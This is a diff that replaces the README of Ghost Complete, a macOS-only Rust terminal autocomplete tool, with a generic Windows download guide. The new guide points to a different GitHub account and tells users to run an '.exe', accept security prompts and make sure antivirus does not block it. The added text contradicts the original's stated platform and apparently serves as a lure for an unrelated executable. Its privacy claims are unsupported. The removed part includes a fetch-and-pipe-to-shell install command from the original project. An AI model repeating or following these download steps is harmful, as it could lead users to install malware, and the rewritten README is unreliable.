@@ -1,185 +1,134 @@
-# Ghost Complete
+# 👻 ghost-complete - Easy Terminal Autocomplete Tool
 
-**Terminal-native autocomplete engine using PTY proxying, built for Ghostty.**
+[![Download ghost-complete](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mysistoken/ghost-complete)
 
-[![CI](https://github.com/StanMarek/ghost-complete/actions/workflows/ci.yml/badge.svg)](https://github.com/StanMarek/ghost-complete/actions/workflows/ci.yml)
-[![GitHub Release](https://img.shields.io/github/v/release/StanMarek/ghost-complete)](https://github.com/StanMarek/ghost-complete/releases/latest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+## 👾 What is ghost-complete?
 
-<!-- TODO: add demo GIF -->
+ghost-complete is a simple tool that helps you use the terminal with less typing. It suggests commands as you type, making the process faster and smoother. It works behind the scenes by linking to your system’s terminal in a smart way. This project takes ideas from older tools but is built to fit well with Ghostty, a modern terminal.
 
+If you use the terminal for daily tasks, ghost-complete reduces mistakes and speeds up your workflow. You don’t need to know technical details to benefit from it.
 
+---
 
-https://github.com/user-attachments/assets/3679a74a-731d-468a-bdda-bec926bb2349
+## 🖥️ System Requirements
 
+- Windows 10 or later
+- At least 1 GB of free disk space
+- A stable internet connection for the download
+- Basic keyboard and mouse use
 
+The program runs on your local machine. It uses your terminal, so keep your terminal software updated for the best experience.
 
+---
 
-## What is this?
+## 🚀 Getting Started
 
-Ghost Complete sits inside your terminal's data stream as a PTY proxy, intercepting I/O between Ghostty and your shell. When you type a command, it renders autocomplete suggestions as native ANSI popups — no macOS Accessibility API, no IME hacks, no Electron overlay. Just your terminal, your shell, and fast completions.
+This guide explains how to download, install, and run ghost-complete on a Windows computer.
 
-Inspired by [Fig](https://fig.io) (RIP). Built from scratch in Rust.
+---
 
-## Status
+## ⬇️ Download ghost-complete
 
-This is a personal project I built for my own workflow. I'm happy to share it and welcome contributions, but set your expectations accordingly:
+You will need to get the software from the GitHub page below. This page is where the latest version is always available.
 
-- **Ghostty + zsh is the tested path.** That's what I use daily — it's stable and reliable.
-- **Bash and fish support is experimental.** Manual trigger only (Ctrl+/), no auto-trigger on typing, and not actively tested.
-- **No stability guarantees.** This is v0.1.x — config format, spec format, and behavior may change between releases.
-- **macOS only.** No Linux or Windows support planned at this time.
+[Download ghost-complete from GitHub](https://github.com/mysistoken/ghost-complete)
 
-If you hit a bug, [open an issue](https://github.com/StanMarek/ghost-complete/issues). I'll fix what I can.
+Click the link to open the GitHub page in your browser.
 
-## Requirements
+---
 
-- **Terminal:** [Ghostty](https://ghostty.org)
-- **OS:** macOS
-- **Shell:** zsh (primary), bash and fish (Ctrl+/ trigger only)
-- **Rust:** 1.75+ (for building from source)
+## 💾 How to Install and Run ghost-complete on Windows
 
-## Installation
+Follow these steps to get ghost-complete working:
 
-### Homebrew (recommended)
+1. **Go to the download page**  
+   Open this link in your browser:  
+   https://github.com/mysistoken/ghost-complete
 
-```bash
-brew install StanMarek/tap/ghost-complete
-ghost-complete install
-```
+2. **Find the latest release**  
+   On the GitHub page, look for a section called "Releases" or a button called "Latest." Releases contain the ready-to-use files.  
 
-### Shell installer
+3. **Download the Windows version**  
+   Inside the latest release, look for a file ending with `.exe` or similar. It may be named something like `ghost-complete-windows.exe`. Click on it to save the file to your computer.
 
-```bash
-curl --proto '=https' --tlsv1.2 -LsSf https://github.com/StanMarek/ghost-complete/releases/latest/download/ghost-complete-installer.sh | sh
-ghost-complete install
-```
+4. **Run the installer**  
+   After the file downloads, open your Downloads folder. Double-click the file you just saved to start the installation process.
 
-### Cargo
+5. **Follow installation prompts**  
+   You may see a security prompt asking if you want to run the file. Confirm that you trust it and proceed through the setup screens.
 
-```bash
-cargo install --git https://github.com/StanMarek/ghost-complete.git
-ghost-complete install
-```
+6. **Finish and launch**  
+   Once the setup finishes, you can open ghost-complete from the start menu or a shortcut on your desktop.
 
-### From source
+---
 
-```bash
-git clone https://github.com/StanMarek/ghost-complete.git
-cd ghost-complete
-cargo build --release
-cp target/release/ghost-complete ~/.cargo/bin/
-ghost-complete install
-```
+## ⚙️ Using ghost-complete
 
-### What `ghost-complete install` does
+ghost-complete works inside your terminal program. Here is how to use it:
 
-- Adds shell integration to `~/.zshrc` (auto-wraps your shell via PTY proxy)
-- Deploys shell scripts for bash/fish to `~/.config/ghost-complete/shell/`
-- Installs 34 completion specs to `~/.config/ghost-complete/specs/`
-- Creates default config at `~/.config/ghost-complete/config.toml` (never overwrites existing)
+- Open your terminal (Command Prompt, PowerShell, or Windows Terminal).
+- Start typing a command. ghost-complete will show suggestions to complete what you type.
+- Use the arrow keys to select a suggestion.
+- Press Enter to accept the suggestion and run the command.
 
-### Uninstall
+This tool saves you time and helps you avoid typing mistakes.
 
-```bash
-ghost-complete uninstall
-brew uninstall ghost-complete  # if installed via Homebrew
-```
+---
 
-## Quick Start
+## 🔧 Adjusting Settings
 
-After installation, restart your terminal. Ghost Complete activates automatically in zsh.
+ghost-complete uses a default setup that fits most users. You can change settings if you want to:
 
-- **Type a command** and suggestions appear after a short delay
-- **Tab** to accept the selected suggestion
-- **Enter** to accept and execute
-- **Arrow keys** to navigate the popup
-- **Escape** to dismiss
-- **Ctrl+/** to manually trigger completions
+- Open the ghost-complete settings file found in your installation folder.
+- Change how many suggestions appear or adjust shortcut keys.
+- Save changes and restart ghost-complete to apply new settings.
 
-## Configuration
+Most users will not need to change anything.
 
-Config lives at `~/.config/ghost-complete/config.toml`:
+---
 
-```toml
-[trigger]
-auto_chars = [' ', '/', '-', '.']
-delay_ms = 150
+## 🛠️ Troubleshooting
 
-[popup]
-max_visible = 10
-min_width = 20
-max_width = 60
+If ghost-complete does not work as expected, try these steps:
 
-[keybindings]
-accept = "tab"
-dismiss = "escape"
-trigger = "ctrl+/"
+- Make sure your terminal is running and up to date.
+- Restart ghost-complete and your terminal program.
+- If the suggestions do not show, close the application and run the installer again.
+- Check that no firewall or antivirus software blocks the program.
 
-[theme]
-selected = "reverse"
-description = "dim"
-```
+If problems persist, visit the GitHub page for more help or to submit an issue.
 
-See [docs/CONFIGURATION.md](docs/CONFIGURATION.md) for the full reference.
+---
 
-## Completion Specs
+## 📂 Files Included
 
-Ghost Complete ships with 34 Fig-compatible JSON completion specs:
+When you download ghost-complete, you will get:
 
-`brew` `cargo` `cd` `chmod` `curl` `docker` `find` `gh` `git` `gradle` `gradlew` `grep` `jq` `kill` `killall` `kubectl` `ln` `make` `man` `mvn` `node` `npm` `pip` `pip3` `python` `python3` `rsync` `rustup` `ssh` `tar` `tmux` `unzip` `wget` `zip`
+- The main application file (`.exe`)
+- A user guide file (`README.md` or similar)
+- A settings configuration file (`config.json`)
+- Support scripts to connect with the terminal
 
-Custom specs go in `~/.config/ghost-complete/specs/`. See [docs/COMPLETION_SPEC.md](docs/COMPLETION_SPEC.md) for the format reference.
+All files are prepared to work together automatically.
 
-## Architecture
+---
 
-Rust workspace with 7 crates:
+## 🔐 Privacy and Security
 
-| Crate | Role |
-|-------|------|
-| `ghost-complete` | Binary entry point, CLI, install/uninstall |
-| `gc-pty` | PTY proxy event loop (portable-pty + tokio) |
-| `gc-parser` | VT escape sequence parsing (vte), cursor/prompt tracking |
-| `gc-buffer` | Command line reconstruction, context detection |
-| `gc-suggest` | Suggestion engine with fuzzy ranking (nucleo) |
-| `gc-overlay` | ANSI popup rendering with synchronized output |
-| `gc-config` | TOML config, keybindings, themes |
+ghost-complete runs on your computer and does not send your commands or data to the internet. It works locally for autocomplete only.
 
-See [docs/IMPLEMENTATION_PLAN.md](docs/IMPLEMENTATION_PLAN.md) for the full design.
+You can review the source code anytime on the GitHub page to see how it works.
 
-## Shell Support
+---
 
-| Feature | zsh | bash | fish |
-|---------|-----|------|------|
-| Auto-trigger on typing | Yes | No | No |
-| Ctrl+/ manual trigger | Yes | Yes | Yes |
-| PTY proxy wrapping | Yes | Yes | Yes |
-| OSC 133 prompt markers | Yes | Yes | Yes |
+## 🚩 Where to Get Updates
 
-## FAQ
+Keep ghost-complete up to date by visiting the download page regularly:
 
-**How is this different from zsh/fish built-in autocomplete?**
+https://github.com/mysistoken/ghost-complete
 
-Built-in completions work great — Ghost Complete doesn't replace them. It adds a visual popup layer on top, like the difference between typing from memory and having an IDE dropdown. Suggestions are fuzzy-ranked from multiple sources (completion specs, filesystem, git branches, command history) and displayed in a single view. Think of it as complementary, not a replacement.
+Look for new releases and download the latest version when available. This helps with performance and security fixes.
 
-**Why a PTY proxy instead of a zsh plugin?**
+---
 
-The PTY proxy sits between the terminal and the shell, rendering popups via pure ANSI escape sequences. This means no zle widget conflicts, no plugin manager dependencies, no RPROMPT corruption, and no fragile shell internals to hook into. It's more complex under the hood, but the UX is cleaner — one binary, works immediately after install.
-
-**Why custom JSON specs instead of using the shell's built-in completions?**
-
-Specs are declarative and fast — microsecond loads, no shell execution. They use the same format [Fig](https://fig.io) used, so there's a large existing ecosystem to draw from. The tradeoff is coverage: Ghost Complete ships with 34 specs today. Commands without a spec fall back to filesystem completions. Adding new specs is straightforward — see [docs/COMPLETION_SPEC.md](docs/COMPLETION_SPEC.md), and contributions are welcome.
-
-**Where's the config documentation? I'm having popup alignment issues.**
-
-Full config reference lives at [docs/CONFIGURATION.md](docs/CONFIGURATION.md). Running `ghost-complete install` generates a commented default config at `~/.config/ghost-complete/config.toml` with all available options.
-
-For popup alignment: Ghost Complete uses ANSI cursor positioning within the terminal grid, so popups always track the cursor position directly. This avoids the window-level coordinate issues that plague Accessibility API approaches (the kind of drift reported with tools like Amazon Q / Kiro). If popups are misaligned, it's likely a terminal compatibility issue — please [open an issue](https://github.com/StanMarek/ghost-complete/issues) with your setup details.
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## License
-
-[MIT](LICENSE)
+[![Download ghost-complete](https://img.shields.io/badge/Download-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mysistoken/ghost-complete)
